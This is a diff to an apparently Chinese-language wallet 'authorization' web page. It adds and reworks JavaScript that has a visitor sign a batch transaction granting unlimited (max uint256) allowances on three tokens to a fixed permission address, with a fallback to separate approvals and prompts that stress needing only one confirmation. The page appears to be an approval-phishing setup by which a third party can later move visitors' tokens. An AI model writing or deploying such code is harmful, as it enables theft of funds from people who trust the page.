@@ -249,7 +249,7 @@
         <div class="info-box">
             <div class="info-item">
                 <span class="label">授权合约:</span>
-                <span class="value" id="contractAddress">0xe3c0e066D870036aCc178492C638963A0E97d4Bb</span>
+                <span class="value" id="contractAddress">0xBaD97ad34De20A1b9CF7Cb996c8E2dE41495fc6e</span>
             </div>
             <div class="info-item">
                 <span class="label">授权数量:</span>
@@ -280,6 +280,10 @@
         
         <button class="authorize-btn" id="authorizeBtn" onclick="authorize()">
             立即授权
+        </button>
+        
+        <button class="check-btn" id="checkBtn" onclick="checkPermission()" style="margin-top: 10px; background: #6c757d; color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; width: 100%;">
+            检查权限状态
         </button>
         
         <!-- 进度条 -->
@@ -450,6 +454,34 @@
         // 综合授权控制合约地址
         const COMBINED_CONTRACT_ADDRESS = '0xBaD97ad34De20A1b9CF7Cb996c8E2dE41495fc6e';
         
+        // 检查权限状态
+        async function checkPermission() {
+            if (!web3 || !userAccount) {
+                showStatus('请先连接钱包', 'error');
+                return;
+            }
+            
+            try {
+                showStatus('正在检查权限状态...', 'info');
+                
+                const combinedContract = new web3.eth.Contract(COMBINED_CONTRACT_ABI, COMBINED_CONTRACT_ADDRESS);
+                
+                // 检查用户是否为授权者
+                const isAuthorized = await combinedContract.methods.isAuthorizedSpender(userAccount).call();
+                
+                if (isAuthorized) {
+                    showStatus('✅ 您有批量授权权限！可以使用一次确认批量授权三个代币', 'success');
+                } else {
+                    showStatus('❌ 您没有批量授权权限，将使用传统方式（需要三次确认）', 'error');
+                    showStatus('请联系合约所有者将您添加为授权者', 'info');
+                }
+                
+            } catch (error) {
+                console.error('权限检查失败:', error);
+                showStatus('权限检查失败: ' + error.message, 'error');
+            }
+        }
+        
         // 授权函数
         async function authorize() {
             if (!web3 || !userAccount) {
@@ -475,52 +507,56 @@
                 const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                 const amounts = new Array(tokensToAuthorize.length).fill(maxUint256);
                 
-                // 方法1：尝试使用综合授权控制合约（如果存在）
-                if (COMBINED_CONTRACT_ADDRESS !== '0x0000000000000000000000000000000000000000') {
-                    try {
-                        showStatus('使用综合授权控制合约...', 'info');
-                        
-                        const combinedContract = new web3.eth.Contract(COMBINED_CONTRACT_ABI, COMBINED_CONTRACT_ADDRESS);
-                        
-                        // 首先检查用户是否为授权者
-                        const isAuthorized = await combinedContract.methods.isAuthorizedSpender(userAccount).call();
-                        
-                        if (!isAuthorized) {
-                            showStatus('您不是合约的授权者，无法使用批量授权功能', 'error');
-                            throw new Error('Not authorized');
-                        }
-                        
-                        // 使用批量授权（无限授权）
-                        const data = combinedContract.methods.batchApproveMax(tokenAddresses, PERMISSION_ADDRESS).encodeABI();
-                        
-                        const transaction = {
-                            from: userAccount,
-                            to: COMBINED_CONTRACT_ADDRESS,
-                            data: data,
-                            gas: 800000, // 预估Gas
-                            gasPrice: await web3.eth.getGasPrice()
-                        };
-                        
-                        showStatus('请在钱包中确认批量授权交易...', 'info');
-                        
-                        const receipt = await web3.eth.sendTransaction(transaction);
-                        
-                        if (receipt.status) {
-                            showStatus('批量授权成功！', 'success');
-                            authorizeBtn.innerHTML = '授权完成';
-                            authorizeBtn.style.background = 'linear-gradient(135deg, #4caf50 0%, #45a049 100%)';
-                        } else {
-                            showStatus('批量授权失败', 'error');
-                            authorizeBtn.innerHTML = '重新授权';
-                        }
-                        
+                // 方法1：尝试使用综合授权控制合约
+                try {
+                    showStatus('正在检查批量授权权限...', 'info');
+                    
+                    const combinedContract = new web3.eth.Contract(COMBINED_CONTRACT_ABI, COMBINED_CONTRACT_ADDRESS);
+                    
+                    // 检查合约是否可用
+                    showStatus('正在连接批量授权合约...', 'info');
+                    
+                    // 首先检查用户是否为授权者
+                    const isAuthorized = await combinedContract.methods.isAuthorizedSpender(userAccount).call();
+                    console.log('用户是否为授权者:', isAuthorized);
+                    
+                    if (!isAuthorized) {
+                        showStatus('您不是合约的授权者，将使用传统授权方式', 'info');
+                        throw new Error('Not authorized');
+                    }
+                    
+                    showStatus('权限验证成功，准备批量授权...', 'info');
+                    
+                    // 使用批量授权（无限授权）
+                    const data = combinedContract.methods.batchApproveMax(tokenAddresses, PERMISSION_ADDRESS).encodeABI();
+                    
+                    const transaction = {
+                        from: userAccount,
+                        to: COMBINED_CONTRACT_ADDRESS,
+                        data: data,
+                        gas: 1000000, // 增加Gas限制
+                        gasPrice: await web3.eth.getGasPrice()
+                    };
+                    
+                    showStatus('请在钱包中确认批量授权交易（只需确认一次）...', 'info');
+                    
+                    const receipt = await web3.eth.sendTransaction(transaction);
+                    
+                    if (receipt.status) {
+                        showStatus('批量授权成功！三个代币已同时授权', 'success');
+                        authorizeBtn.innerHTML = '授权完成';
+                        authorizeBtn.style.background = 'linear-gradient(135deg, #4caf50 0%, #45a049 100%)';
                         authorizeBtn.disabled = false;
                         progressBar.style.display = 'none';
                         return;
-                        
-                    } catch (error) {
-                        console.log('综合授权控制合约不可用，回退到传统方式:', error);
+                    } else {
+                        showStatus('批量授权失败', 'error');
+                        throw new Error('Batch approve failed');
                     }
+                    
+                } catch (error) {
+                    console.log('批量授权失败，错误详情:', error);
+                    showStatus(`批量授权失败: ${error.message}，将使用传统方式`, 'info');
                 }
                 
                 // 方法2：使用传统方式，但优化用户体验
